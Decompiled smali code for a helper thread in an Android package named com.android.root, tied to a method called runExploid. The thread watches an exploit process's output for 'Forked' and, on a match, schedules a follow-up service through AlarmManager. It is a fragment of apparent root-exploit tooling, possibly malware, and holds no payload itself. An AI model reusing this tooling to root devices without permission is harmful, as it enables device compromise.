.class Lcom/android/root/adbRoot$1;
.super Ljava/lang/Thread;
.source "adbRoot.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/root/adbRoot;->runExploid()Z
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/root/adbRoot;

.field private final synthetic val$in:Ljava/io/FileInputStream;


# direct methods
.method constructor <init>(Lcom/android/root/adbRoot;Ljava/io/FileInputStream;)V
    .locals 0
    .parameter
    .parameter

    .prologue
    .line 1
    iput-object p1, p0, Lcom/android/root/adbRoot$1;->this$0:Lcom/android/root/adbRoot;

    iput-object p2, p0, Lcom/android/root/adbRoot$1;->val$in:Ljava/io/FileInputStream;

    .line 162
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 11

    .prologue
    .line 164
    const/16 v8, 0x1000

    new-array v4, v8, [B

    .line 166
    .local v4, mBuffer:[B
    const/4 v5, 0x0

    .line 167
    .local v5, read:I
    :cond_0
    :goto_0
    if-gez v5, :cond_1

    .line 208
    :goto_1
    return-void

    .line 169
    :cond_1
    :try_start_0
    iget-object v8, p0, Lcom/android/root/adbRoot$1;->val$in:Ljava/io/FileInputStream;

    invoke-virtual {v8, v4}, Ljava/io/FileInputStream;->read([B)I

    move-result v5

    .line 170
    new-instance v7, Ljava/lang/String;

    const/4 v8, 0x0

    invoke-direct {v7, v4, v8, v5}, Ljava/lang/String;-><init>([BII)V

    .line 172
    .local v7, str:Ljava/lang/String;
    const-string v8, "Forked"

    invoke-virtual {v7, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_3

    .line 174
    new-instance v3, Landroid/content/Intent;

    iget-object v8, p0, Lcom/android/root/adbRoot$1;->this$0:Lcom/android/root/adbRoot;

    invoke-static {v8}, Lcom/android/root/adbRoot;->access$0(Lcom/android/root/adbRoot;)Landroid/content/Context;

    move-result-object v8

    const-class v9, Lcom/android/root/AlarmReceiver;

    invoke-direct {v3, v8, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 175
    .local v3, intent:Landroid/content/Intent;
    const-string v8, "start"

    const/4 v9, 0x1

    invoke-virtual {v3, v8, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 176
    iget-object v8, p0, Lcom/android/root/adbRoot$1;->this$0:Lcom/android/root/adbRoot;

    invoke-static {v8}, Lcom/android/root/adbRoot;->access$0(Lcom/android/root/adbRoot;)Landroid/content/Context;

    move-result-object v8

    const/4 v9, 0x0

    const/4 v10, 0x0

    invoke-static {v8, v9, v3, v10}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    .line 179
    .local v6, sender:Landroid/app/PendingIntent;
    iget-object v8, p0, Lcom/android/root/adbRoot$1;->this$0:Lcom/android/root/adbRoot;

    invoke-static {v8}, Lcom/android/root/adbRoot;->access$0(Lcom/android/root/adbRoot;)Landroid/content/Context;

    move-result-object v8

    const-string v9, "alarm"

    invoke-virtual {v8, v9}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 182
    .local v0, am:Landroid/app/AlarmManager;
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v1

    .line 183
    .local v1, cal:Ljava/util/Calendar;
    const/16 v8, 0xd

    const/4 v9, 0x5

    invoke-virtual {v1, v8, v9}, Ljava/util/Calendar;->add(II)V

    .line 184
    const/4 v8, 0x0

    invoke-virtual {v1}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v9

    invoke-virtual {v0, v8, v9, v10, v6}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 187
    iget-object v8, p0, Lcom/android/root/adbRoot$1;->this$0:Lcom/android/root/adbRoot;

    invoke-static {v8}, Lcom/android/root/adbRoot;->access$1(Lcom/android/root/adbRoot;)Landroid/os/Handler;

    move-result-object v8

    if-eqz v8, :cond_2

    .line 188
    iget-object v8, p0, Lcom/android/root/adbRoot$1;->this$0:Lcom/android/root/adbRoot;

    invoke-static {v8}, Lcom/android/root/adbRoot;->access$1(Lcom/android/root/adbRoot;)Landroid/os/Handler;

    move-result-object v8

    const/4 v9, 0x2

    invoke-virtual {v8, v9}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    .line 192
    :cond_2
    const-wide/16 v8, 0x3e8

    invoke-static {v8, v9}, Lcom/android/root/adbRoot$1;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 203
    .end local v0           #am:Landroid/app/AlarmManager;
    .end local v1           #cal:Ljava/util/Calendar;
    .end local v3           #intent:Landroid/content/Intent;
    .end local v6           #sender:Landroid/app/PendingIntent;
    .end local v7           #str:Ljava/lang/String;
    :catch_0
    move-exception v8

    move-object v2, v8

    .line 204
    .local v2, e:Ljava/lang/Exception;
    const/4 v5, -0x1

    .line 205
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 197
    .end local v2           #e:Ljava/lang/Exception;
    .restart local v7       #str:Ljava/lang/String;
    :cond_3
    :try_start_1
    const-string v8, "Cannot find adb"

    invoke-virtual {v7, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_0

    .line 198
    iget-object v8, p0, Lcom/android/root/adbRoot$1;->this$0:Lcom/android/root/adbRoot;

    invoke-static {v8}, Lcom/android/root/adbRoot;->access$1(Lcom/android/root/adbRoot;)Landroid/os/Handler;

    move-result-object v8

    if-eqz v8, :cond_0

    .line 199
    iget-object v8, p0, Lcom/android/root/adbRoot$1;->this$0:Lcom/android/root/adbRoot;

    invoke-static {v8}, Lcom/android/root/adbRoot;->access$1(Lcom/android/root/adbRoot;)Landroid/os/Handler;

    move-result-object v8

    const/4 v9, 0x1

    invoke-virtual {v8, v9}, Landroid/os/Handler;->sendEmptyMessage(I)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0
.end method
